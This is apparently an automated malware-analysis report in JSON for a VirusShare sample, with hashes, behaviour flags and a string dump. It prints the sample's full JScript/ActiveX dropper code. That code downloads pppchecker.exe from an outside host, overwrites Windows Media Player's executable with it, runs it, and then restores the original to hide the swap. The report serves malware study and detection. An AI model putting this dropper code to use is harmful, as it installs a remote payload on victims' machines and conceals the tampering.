{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "ADODB.Stream": "May create a text file",
            "Microsoft.XMLHTTP": "May download files from the Internet",
            "Open": "May open a file",
            "SaveToFile": "May create a text file",
            "Windows": "May enumerate application windows",
            "Write": "May write to a file",
            "WriteText": "May create a text file"
        },
        "macro": "try{\nw = [\n\"C:\\\\Program Files\\\\Windows Media Player\\\\\",\n\"C:\\\\Programmer\\\\Windows Media Player\\\\\",\n\"C:\\\\Program\\\\Windows Media Player\\\\\",\n\"C:\\\\Programme\\\\Windows Media Player\\\\\",\n\"C:\\\\Programmi\\\\Windows Media Player\\\\\",\n\"C:\\\\Programfiler\\\\Windows Media Player\\\\\",\n\"C:\\\\Programas\\\\Windows Media Player\\\\\",\n\"C:\\\\Archivos de programa\\\\Windows Media Player\\\\\",\n\"D:\\\\Program Files\\\\Windows Media Player\\\\\",\n\"D:\\\\Programmer\\\\Windows Media Player\\\\\",\n\"D:\\\\Program\\\\Windows Media Player\\\\\",\n\"D:\\\\Programme\\\\Windows Media Player\\\\\",\n\"D:\\\\Programmi\\\\Windows Media Player\\\\\",\n\"D:\\\\Programfiler\\\\Windows Media Player\\\\\",\n\"D:\\\\Programas\\\\Windows Media Player\\\\\",\n\"D:\\\\Archivos de programa\\\\Windows Media Player\\\\\"\n];\nn = [\n];\nvar g_WRestored = 0;\nvar g_NRestored = 0;\nvar WMRun = 0;\nvar NRun = 0;\nvar dat = new ActiveXObject(\"ADODB.Stream\");\ndat.Mode = 3; dat.Type = 2; dat.Open();dat.Charset = \"ascii\";\ndat.WriteText(\"100\");\ndat.SaveToFile(\"C:\\\\Recycled\\\\Q382098.inf\",2);\n\nvar ldr = new ActiveXObject(\"Microsoft.XMLHTTP\");\nldr.Open(\"GET\",\"http://hq-dialer.com/pppchecker.exe\",0 );//\"http://hq-dialer.com/pppchecker.exe\",0);\nldr.Send();\nvar s = new ActiveXObject(\"ADODB.Stream\");\ns.Mode = 3; s.Type = 1; s.Open();\ns.Write(ldr.responseBody);\nfor (i = 0; i < w.length; i++)\n{\n   if (1 == FSave(w[i], \"wmplayer.exe\"))\n      WMRun = 1;\n}\nfor (i = 0 ; i < n.length; i++)\n{\n   if (1 == FSave(n[i], \"notepad.exe\"))\n      NRun = 1;\n}\nsetInterval(\"Restore()\",3500);\nif (WMRun == 1)\n   location = \"mms://\";\nif (NRun == 1)\n   window.open(\"view-source:file://C:/\",\"_search\");\n}\ncatch(e){};\nfunction FSave(path, file)\n{\n   try\n   {\n      lpath = \"file://\"+path.replace(/[\\\\]/g,\"/\")+file;\n      var o = new ActiveXObject(\"Microsoft.XMLHTTP\");\n      o.Open(\"GET\", lpath,0);\n      o.Send();\n      var s1 = new ActiveXObject(\"ADODB.Stream\");\n      s1.Mode = 3; s1.Type = 1; s1.Open();\n      s1.Write(o.responseBody);\n      s1.SaveToFile(path+file+\".bak\",2);\n      s.SaveToFile(path+file,2);\n      if (s.Position == 0)\n      {\n         s.Write(ldr.responseBody);\n         return (1);\n      }\n   }\n   catch(e){};\n   return (0);\n}\nfunction FRestore(path, file)\n{\n   try\n   {\n      var sv = new ActiveXObject(\"ADODB.Stream\");\n      sv.Mode = 3;\n      sv.Type = 1;\n      sv.Open();\n      var tMP = new ActiveXObject(\"Microsoft.XMLHTTP\");\n      lpath = \"file://\"+path.replace(/[\\\\]/g,\"/\")+file+\".bak\";\n      tMP.Open(\"GET\", lpath,0);\n      tMP.Send();\n      sv.Write(tMP.responseBody);\n      sv.SaveToFile(path+file,2);\n      return (1);\n   }\n   catch(e){};\n   return (0);\n}\nfunction Restore(file)\n{\n   if (g_WRestored == 0)\n   {\n      for (i = 0; i < w.length; i++)\n      {\n         if (1 == FRestore(w[i], \"wmplayer.exe\"))\n            g_WRestored = 1;\n      }\n   }\n   if (g_NRestored == 0)\n   {\n      for (i = 0; i < n.length; i++)\n      {\n         if (1 == FRestore(n[i], \"notepad.exe\"))\n            g_NRestored = 1;\n      }\n   }\n}"
    },
    "filename": "VirusShare_04d8729e3a4ac53098db8d0d7719b7ca",
    "filesize": 2898,
    "filetype": "ASCII text",
    "hashes": {
        "md5": "04d8729e3a4ac53098db8d0d7719b7ca",
        "sha1": "857eb5ad96092a2f0d72f3f6445ae07507d4f4be",
        "sha256": "55dd66f564a10ef6a643fbe5b104feb44e49e205c4f0d7ba537061159f04833f"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "try{",
            "w = [",
            "\"C:\\\\Program Files\\\\Windows Media Player\\\\\",",
            "\"C:\\\\Programmer\\\\Windows Media Player\\\\\",",
            "\"C:\\\\Program\\\\Windows Media Player\\\\\",",
            "\"C:\\\\Programme\\\\Windows Media Player\\\\\",",
            "\"C:\\\\Programmi\\\\Windows Media Player\\\\\",",
            "\"C:\\\\Programfiler\\\\Windows Media Player\\\\\",",
            "\"C:\\\\Programas\\\\Windows Media Player\\\\\",",
            "\"C:\\\\Archivos de programa\\\\Windows Media Player\\\\\",",
            "\"D:\\\\Program Files\\\\Windows Media Player\\\\\",",
            "\"D:\\\\Programmer\\\\Windows Media Player\\\\\",",
            "\"D:\\\\Program\\\\Windows Media Player\\\\\",",
            "\"D:\\\\Programme\\\\Windows Media Player\\\\\",",
            "\"D:\\\\Programmi\\\\Windows Media Player\\\\\",",
            "\"D:\\\\Programfiler\\\\Windows Media Player\\\\\",",
            "\"D:\\\\Programas\\\\Windows Media Player\\\\\",",
            "\"D:\\\\Archivos de programa\\\\Windows Media Player\\\\\"",
            "n = [",
            "var g_WRestored = 0;",
            "var g_NRestored = 0;",
            "var WMRun = 0;",
            "var NRun = 0;",
            "var dat = new ActiveXObject(\"ADODB.Stream\");",
            "dat.Mode = 3; dat.Type = 2; dat.Open();dat.Charset = \"ascii\";",
            "dat.WriteText(\"100\");",
            "dat.SaveToFile(\"C:\\\\Recycled\\\\Q382098.inf\",2);",
            "var ldr = new ActiveXObject(\"Microsoft.XMLHTTP\");",
            "ldr.Open(\"GET\",\"http://hq-dialer.com/pppchecker.exe\",0 );//\"http://hq-dialer.com/pppchecker.exe\",0);",
            "ldr.Send();",
            "var s = new ActiveXObject(\"ADODB.Stream\");",
            "s.Mode = 3; s.Type = 1; s.Open();",
            "s.Write(ldr.responseBody);",
            "for (i = 0; i < w.length; i++)",
            "   if (1 == FSave(w[i], \"wmplayer.exe\"))",
            "      WMRun = 1;",
            "for (i = 0 ; i < n.length; i++)",
            "   if (1 == FSave(n[i], \"notepad.exe\"))",
            "      NRun = 1;",
            "setInterval(\"Restore()\",3500);",
            "if (WMRun == 1)",
            "   location = \"mms://\";",
            "if (NRun == 1)",
            "   window.open(\"view-source:file://C:/\",\"_search\");",
            "catch(e){};",
            "function FSave(path, file)",
            "   try",
            "   {",
            "      lpath = \"file://\"+path.replace(/[\\\\]/g,\"/\")+file;",
            "      var o = new ActiveXObject(\"Microsoft.XMLHTTP\");",
            "      o.Open(\"GET\", lpath,0);",
            "      o.Send();",
            "      var s1 = new ActiveXObject(\"ADODB.Stream\");",
            "      s1.Mode = 3; s1.Type = 1; s1.Open();",
            "      s1.Write(o.responseBody);",
            "      s1.SaveToFile(path+file+\".bak\",2);",
            "      s.SaveToFile(path+file,2);",
            "      if (s.Position == 0)",
            "      {",
            "         s.Write(ldr.responseBody);",
            "         return (1);",
            "      }",
            "   }",
            "   catch(e){};",
            "   return (0);",
            "function FRestore(path, file)",
            "   try",
            "   {",
            "      var sv = new ActiveXObject(\"ADODB.Stream\");",
            "      sv.Mode = 3;",
            "      sv.Type = 1;",
            "      sv.Open();",
            "      var tMP = new ActiveXObject(\"Microsoft.XMLHTTP\");",
            "      lpath = \"file://\"+path.replace(/[\\\\]/g,\"/\")+file+\".bak\";",
            "      tMP.Open(\"GET\", lpath,0);",
            "      tMP.Send();",
            "      sv.Write(tMP.responseBody);",
            "      sv.SaveToFile(path+file,2);",
            "      return (1);",
            "   }",
            "   catch(e){};",
            "   return (0);",
            "function Restore(file)",
            "   if (g_WRestored == 0)",
            "   {",
            "      for (i = 0; i < w.length; i++)",
            "      {",
            "         if (1 == FRestore(w[i], \"wmplayer.exe\"))",
            "            g_WRestored = 1;",
            "      }",
            "   }",
            "   if (g_NRestored == 0)",
            "   {",
            "      for (i = 0; i < n.length; i++)",
            "      {",
            "         if (1 == FRestore(n[i], \"notepad.exe\"))",
            "            g_NRestored = 1;",
            "      }",
            "   }"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "file://",
            "file://C:/",
            "http://hq-dialer.com/pppchecker.exe"
        ]
    },
    "time": "0:00:00.294459",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
